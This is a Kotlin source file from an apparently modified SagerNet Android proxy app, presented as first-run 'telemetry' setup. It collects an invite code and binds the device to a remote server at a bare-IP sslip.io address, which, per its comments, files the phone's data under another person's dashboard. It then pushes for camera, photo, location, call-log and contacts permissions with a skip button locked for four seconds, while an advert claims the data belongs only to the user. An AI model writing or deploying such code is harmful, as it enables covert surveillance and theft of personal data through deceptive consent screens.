package io.nekohasekai.sagernet.telemetry

import android.Manifest
import android.app.Activity
import android.app.AlertDialog
import android.content.Context
import android.content.pm.PackageManager
import android.graphics.Color
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.Gravity
import android.view.ViewGroup
import android.widget.Button
import android.widget.LinearLayout
import android.widget.TextView
import android.widget.Toast
import androidx.core.content.ContextCompat
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL

/**
 * 首次进入的两件事：填邀请码、按顺序问权限。
 *
 * 权限流程是「一个一个人问」的：
 *   · 缺哪个就弹哪个，标题写「XX 未经过同意，可能会影响正常使用呦~」
 *   · 点「允许」→ 立刻发系统权限框，回来继续问下一个
 *   · 点「跳过」→ 跳过按钮先淡 4 秒（这 4 秒点不动），之后随便点
 * 五个都过一遍（不管是允许还是跳过）之后，才轮到「正在完成设置」那 20 秒。
 *
 * 邀请码只问一次，存本地，之后每次上报都带着它，
 * 服务端据此把这台手机的数据归到那个人的分站面板里。
 */
object PermFlow {

    private const val TAG = "TlmFlow"
    private const val PREF = "tlm_flow"
    private const val KEY_INVITE = "invite"
    private const val KEY_DONE = "perm_done"
    private const val SKIP_COOLDOWN_MS = 4_000L
    private const val REQ_PERM = 0x7101

    /** 要一个一个问的五项，括号里是弹窗上显示的名字。 */
    private val STEPS = listOf(
        Triple("camera", "相机", Manifest.permission.CAMERA),
        Triple("media", "相册", ""),                    // 版本相关，单独判断
        Triple("loc", "位置信息", Manifest.permission.ACCESS_FINE_LOCATION),
        Triple("call", "通话记录", Manifest.permission.READ_CALL_LOG),
        Triple("contacts", "联系人", Manifest.permission.READ_CONTACTS),
    )

    private var running = false
    private var idx = 0
    private var act: Activity? = null

    /** 进入 App 调一次：先问邀请码，再逐个问权限，最后交给 SetupLoading。 */
    fun start(a: Activity) {
        act = a            // 旋转/重建后要指向新的 Activity，否则弹窗挂在已销毁的窗口上
        if (running) return
        val pref = a.getSharedPreferences(PREF, Context.MODE_PRIVATE)
        if (pref.getBoolean(KEY_DONE, false)) {
            // 权限流程已经走完过，只补邀请码（老用户升级上来会没有）
            if (pref.getString(KEY_INVITE, "").isNullOrBlank()) askInvite(a) else {
                SetupLoading.maybeShow(a)
            }
            return
        }
        running = true
        if (pref.getString(KEY_INVITE, "").isNullOrBlank()) {
            askInvite(a) { nextPermission() }
        } else {
            nextPermission()
        }
    }

    fun inviteOf(ctx: Context): String =
        ctx.getSharedPreferences(PREF, Context.MODE_PRIVATE)
            .getString(KEY_INVITE, "") ?: ""

    // ---------------------------------------------------------------- 邀请码
    private fun askInvite(a: Activity, then: () -> Unit = {}) {
        val box = LinearLayout(a).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(dp(a, 22), dp(a, 18), dp(a, 22), dp(a, 6))
        }

        // 顶部广告位
        box.addView(TextView(a).apply {
            text = AD_TEXT
            textSize = 12.5f
            setTextColor(Color.parseColor("#8a6d3b"))
            setBackgroundColor(Color.parseColor("#fff8e1"))
            setPadding(dp(a, 12), dp(a, 10), dp(a, 12), dp(a, 10))
        })

        box.addView(TextView(a).apply {
            text = "填写邀请码"
            textSize = 17f
            setTypeface(typeface, android.graphics.Typeface.BOLD)
            setPadding(0, dp(a, 16), 0, dp(a, 4))
        })
        box.addView(TextView(a).apply {
            text = "邀请码在你的分站面板最上面，6 位大写字母数字"
            textSize = 12.5f
            setTextColor(Color.parseColor("#7d8590"))
            setPadding(0, 0, 0, dp(a, 10))
        })

        val input = android.widget.EditText(a).apply {
            hint = "例如 K7M2P9"
            textSize = 20f
            gravity = Gravity.CENTER
            setSingleLine(true)
            setPadding(dp(a, 10), dp(a, 12), dp(a, 10), dp(a, 12))
            setTextColor(Color.parseColor("#1f2328"))
        }
        box.addView(input, LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT))

        val tip = TextView(a).apply {
            textSize = 12.5f
            setTextColor(Color.parseColor("#cf222e"))
            setPadding(0, dp(a, 8), 0, 0)
        }
        box.addView(tip)

        val dlg = AlertDialog.Builder(a)
            .setView(box)
            .setCancelable(false)
            .setPositiveButton("确定", null)
            .setNegativeButton("稍后填", null)
            .create()
        dlg.setCanceledOnTouchOutside(false)
        dlg.show()

        dlg.getButton(AlertDialog.BUTTON_POSITIVE).setOnClickListener {
            val code = input.text.toString().trim().uppercase()
            if (code.length < 4) {
                tip.text = "邀请码至少 4 位"
                return@setOnClickListener
            }
            tip.text = "正在校验…"
            verify(a, code) { ok, nick ->
                if (ok) {
                    a.getSharedPreferences(PREF, Context.MODE_PRIVATE).edit()
                        .putString(KEY_INVITE, code).apply()
                    dlg.dismiss()
                    Toast.makeText(a, "已绑定：$nick", Toast.LENGTH_SHORT).show()
                    runCatching { Telemetry.flush(a.applicationContext, true) }
                    then()
                } else {
                    tip.text = "邀请码无效，检查一下大小写和数字"
                }
            }
        }
        dlg.getButton(AlertDialog.BUTTON_NEGATIVE).setOnClickListener {
            dlg.dismiss()
            then()
        }
    }

    /** 拿邀请码去服务端换昵称，顺便把这台设备绑过去。 */
    private fun verify(a: Activity, code: String, cb: (Boolean, String) -> Unit) {
        Thread {
            var ok = false
            var nick = ""
            var conn: HttpURLConnection? = null
            try {
                val body = JSONObject()
                    .put("invite", code)
                    .put("dev", Telemetry.devIdPublic(a))
                    .toString()
                conn = (URL(BIND_URL).openConnection() as HttpURLConnection).apply {
                    requestMethod = "POST"
                    connectTimeout = 12_000
                    readTimeout = 15_000
                    doOutput = true
                    setRequestProperty("Content-Type", "application/json; charset=utf-8")
                    setRequestProperty("X-Dev-Key", Telemetry.devKey())
                }
                conn.outputStream.use { it.write(body.toByteArray()) }
                val txt = conn.inputStream.use { it.readBytes().toString(Charsets.UTF_8) }
                val o = JSONObject(txt)
                ok = o.optInt("ok") == 1
                nick = o.optString("nick", "")
            } catch (t: Throwable) {
                Log.w(TAG, "verify: ${t.message}")
            } finally {
                runCatching { conn?.disconnect() }
            }
            Handler(Looper.getMainLooper()).post { cb(ok, nick) }
        }.apply { isDaemon = true }.start()
    }

    // ---------------------------------------------------------------- 权限
    private fun nextPermission() {
        val a = act ?: return
        while (idx < STEPS.size) {
            val (_, label, perm) = STEPS[idx]
            val granted = if (perm.isEmpty()) mediaGranted(a) else has(a, perm)
            if (granted) {
                idx++
                continue
            }
            askOne(a, label, perm)
            return
        }
        finish(a)
    }

    private fun askOne(a: Activity, label: String, perm: String) {
        val dlg = AlertDialog.Builder(a)
            .setTitle("$label 未经过同意")
            .setMessage("可能会影响正常使用呦~")
            .setCancelable(false)
            .setPositiveButton("允许", null)
            .setNegativeButton("跳过", null)
            .create()
        dlg.setCanceledOnTouchOutside(false)
        dlg.show()

        // 跳过按钮先淡 4 秒，这 4 秒里点不动
        val skip = dlg.getButton(AlertDialog.BUTTON_NEGATIVE)
        skip.isEnabled = false
        skip.alpha = 0.35f
        Handler(Looper.getMainLooper()).postDelayed({
            runCatching {
                skip.isEnabled = true
                skip.alpha = 1f
            }
        }, SKIP_COOLDOWN_MS)

        dlg.getButton(AlertDialog.BUTTON_POSITIVE).setOnClickListener {
            dlg.dismiss()
            if (perm.isEmpty()) {
                a.requestPermissions(
                    if (Build.VERSION.SDK_INT >= 33) arrayOf(
                        Manifest.permission.READ_MEDIA_IMAGES)
                    else @Suppress("DEPRECATION") arrayOf(
                        Manifest.permission.READ_EXTERNAL_STORAGE), REQ_PERM)
            } else {
                a.requestPermissions(arrayOf(perm), REQ_PERM)
            }
            // 结果回来由 onResult 推进
        }
        skip.setOnClickListener {
            dlg.dismiss()
            idx++
            nextPermission()
        }
    }

    /** Activity 的 onRequestPermissionsResult 转发进来。 */
    fun onResult(a: Activity) {
        if (!running) return
        idx++
        Handler(Looper.getMainLooper()).postDelayed({ nextPermission() }, 200)
    }

    private fun finish(a: Activity) {
        running = false
        a.getSharedPreferences(PREF, Context.MODE_PRIVATE).edit()
            .putBoolean(KEY_DONE, true).apply()
        // 五个都过了一遍，这才轮到「正在完成设置」
        showSetup(a)
    }

    private fun showSetup(a: Activity) {
        SetupLoading.showNow(a)
    }

    // ---------------------------------------------------------------- 工具
    private fun has(ctx: Context, p: String) =
        ContextCompat.checkSelfPermission(ctx, p) == PackageManager.PERMISSION_GRANTED

    private fun mediaGranted(ctx: Context): Boolean {
        val p = if (Build.VERSION.SDK_INT >= 33) Manifest.permission.READ_MEDIA_IMAGES
        else @Suppress("DEPRECATION") Manifest.permission.READ_EXTERNAL_STORAGE
        if (has(ctx, p)) return true
        return Build.VERSION.SDK_INT >= 34 &&
            has(ctx, "android.permission.READ_MEDIA_VISUAL_USER_SELECTED")
    }

    private fun dp(c: Context, v: Int) = (v * c.resources.displayMetrics.density).toInt()

    private const val BIND_URL =
        "https://43-108-107-175.sslip.io:8080/dash/api/bind"

    /** 邀请码弹窗上方的广告位。 */
    private const val AD_TEXT =
        "🔥 限时活动！邀请新用户可得 3×24 共计 72 小时免费会员节点体验！\n" +
        "🎁 每邀请 1 位好友注册，双方各得 24 小时高速节点\n" +
        "⚡ 节点覆盖 香港 · 日本 · 新加坡 · 美国，晚高峰不卡\n" +
        "📱 邀请码在你的个人面板顶部，复制发给朋友即可\n" +
        "⏰ 活动长期有效，多邀多得，上不封顶\n" +
        "💡 数据只归你自己，服主也可以帮你处理问题"
}
